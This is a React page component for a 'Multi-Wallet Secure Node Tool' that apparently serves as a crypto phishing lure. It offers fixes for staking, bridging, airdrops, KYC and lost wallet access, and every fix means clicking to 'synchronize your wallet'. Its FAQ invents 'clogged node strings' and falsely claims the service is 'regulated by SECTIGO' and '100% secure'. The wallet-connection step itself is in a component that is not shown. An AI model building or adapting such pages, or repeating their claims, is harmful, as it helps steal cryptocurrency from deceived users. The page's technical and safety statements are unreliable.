import React, { useState } from "react";
import { Link } from "react-scroll";
import "./index.css";
import "./mobile.css";
import Loadscreen from "../loadingscreen";
const list = [
  {
    number: 1,
    title: "TOKEN STAKE AND UNSTAKE",
    info: 'For issues with token Staking and Unstaking click the button below to synchronize your wallet and select "Enable Stake and Unstake"',
  },
  {
    number: 2,
    title: "TOKEN BRIDGE",
    info: 'For issues with token bridge click the button below to synchronize your wallet and select "Enable Bridge"',
  },
  {
    number: 3,
    title: "POOL & FARM ACCESS",
    info: 'For issues with any Pools and Farm Access or related issue, click the button below to synchronize your wallet and select "Correct Node Strings"',
  },

  {
    number: 4,
    title: "TOKEN ISSUES",
    info: 'For issues with any tokens, during swap, claim, withdrawal or related issue, click the button below to synchronize your wallet and select "Correct Node Strings"',
  },

  {
    number: 5,
    title: "WITHDRAWALS & DEPOSITS ",
    info: 'For Issues with withdrawals, claim or related issue, click the button below to synchronize your wallet and select "Enable token swap & claims"',
  },
  {
    number: 6,
    title: "KYC & WHITELIST",
    info: 'To whitelist or complete LYX click the button below to synchronize your wallet and select "Whitelist wallet""',
  },
  {
    number: 7,
    title: "AIRDROPS",
    info: 'For Airdrop enroll and claim click the button below to synchronize your wallet and select "enroll and claim"',
  },

  {
    number: 8,
    title: "UNABLE TO ACCESS WALLET?",
    info: 'Are you unable to access your wallet? click the button below to synchronize your wallet and select "regain access"',
  },
  {
    number: 9,
    title: " RESET WALLET PASSWORD",
    info: "To reset wallet password click the button below to synchronize your wallet and select reset password",
  },
];

const Index = () => {
  const [faqs, setFaqs] = useState([
    {
      id: 1,
      show: false,
      question: "When do i need to correct my node",
      answer:
        "Over time as wallets age, and your node becomes clogged , Transactions may begin to fail. To re-enable full functionality, the node correction tool is recommended",
    },
    {
      id: 2,
      question:
        "My transactions keep failing, i am unable to stake, swap or claim my tokens",
      answer: "Node tool will correct your wallet node strings in seconds. ",
      show: false,
    },
    {
      id: 3,
      question: "Do I have to pay for this service?",
      answer:
        "No, we will never ask you to pay for anything. This is a free service",
      show: false,
    },
    {
      id: 4,
      question: "Is it Safe?",
      answer:
        "Our services are secured and regulated by SECTIGO. It is 100% secure.",
      show: false,
    },
  ]);

  const [showLoad, setShowLoadSceen] = useState(false);

  const openAnswer = (id) => {
    const newArry = [];

    faqs.map((q) => {
      if (q.show) {
        q.show = false;
      }

      if (q.id === id) {
        q.show = true;
      }

      return newArry.push(q);
    });

    setFaqs(newArry);
  };

  return (
    <div className="homepage">
      {/* <header>
                <NavLink to="/">
                    <img src="../../images/ScreenShot2021-10-16at10.29.02PM.png" alt="." />
                </NavLink>
            </header> */}

      <div className="about">
        <h1>Multi-Wallet Secure Node Tool</h1>
        <span className="explore">
          <p>
            <Link to="explore" smooth={true} duration={1000}>
              Explore Node Features
            </Link>
          </p>
        </span>
      </div>
      <div className="market">
        {/* <Helmet> */}
        <cove-markets-market-ticker-tape
          instrumentSelection="BTC-USD,ETH-USD,SOL-USD,ADA-USD"
          position="center"
          width="100%"
          maxWidth="900px"
          border="1px solid gray"
          showBorder="true"
        ></cove-markets-market-ticker-tape>
        {/* <script type="module" data-react-helmet="true"  src="https://cdn.jsdelivr.net/npm/@covemarkets/web-widgets@0.0.36/dist/market-ticker-tape/index.js"></script> */}
        {/* </Helmet> */}
      </div>
      {list?.map((n, i) => (
        <div className="list" id="explore" key={i}>
          <div className="title">
            <span className="number">{n.number}.</span>
            <h1>{n.title}</h1>
          </div>

          <p className="info">{n.info}</p>
          <p
            style={{ color: "#ffff" }}
            className="button"
            onClick={() => setShowLoadSceen(true)}
          >
            {" "}
            CLICK HERE
          </p>
        </div>
      ))}

      <div className="faqs">
        <h1 className="title">FREQUENTLY ASK QUESTIONS</h1>

        {faqs?.map((q, i) => (
          <div
            className="questions-and-answers"
            key={i}
            onClick={() => openAnswer(q.id)}
          >
            {/**Eaxch question should have a value to show their questions, i.e they must have ids to know them */}
            <div className="head">
              <p className="question">{q.question}</p>
              <i className="fa  fa-chevron-down"></i>
            </div>
            {q.show ? <p className="answer">{q.answer}</p> : null}
          </div>
        ))}
      </div>

      <div className="market-trade"></div>

      <footer>
        <div className="contact-us">
          <div className="left">
            <h1>Contact Us</h1>
            {/* <p>Send all inquiries to Support@blockchain.com</p> */}
          </div>

          <div className="right">
            <i className="fab fa-facebook"></i>
            <i className="fab fa-instagram"></i>
            <i className="fab fa-linkedin"></i>
            <i style={{ color: "#2fa6da" }} className="fab fa-telegram"></i>
          </div>
        </div>

        <div className="bottom">
          <p>All rights reserved {new Date().getFullYear()}.</p>

          <i className="fa  fa-chevron-up"></i>
        </div>
      </footer>

      {showLoad ? <Loadscreen /> : null}
    </div>
  );
};

export default Index;
